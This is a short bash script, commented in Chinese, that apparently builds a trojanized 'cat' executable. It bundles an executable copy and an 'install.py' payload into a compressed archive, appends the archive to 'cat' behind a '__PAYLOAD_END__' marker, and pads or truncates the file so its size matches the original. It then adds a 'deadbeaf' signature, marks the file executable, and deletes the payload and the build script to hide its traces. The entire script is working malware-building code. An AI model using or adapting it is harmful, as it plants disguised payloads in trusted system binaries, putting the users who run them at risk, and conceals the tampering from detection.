#!/bin/bash
# 假設所有文件都已經從server下載過來

# 原本的size
size=$(wc -c temp_cat | awk '{print $1}')
space=`expr $size - 8`

# 壓縮 cat 和 payload
tar -cvzf temp_cat.tar.gz temp_cat install.py > /dev/null 2>&1

# 串接壓縮檔
./temp_cat temp_cat.tar.gz >> cat
echo "\n" >> cat
echo "__PAYLOAD_END__" >> cat

# 調整 size 和最後的 byte deadbeaf
truncate --size=${space} cat
echo -n -e '\x61\x66\x62\x65\x61\x64\x64\x65' >> cat

chmod +x cat

# 刪掉不需要的檔案
rm install.py temp_cat temp_cat.tar.gz build.sh
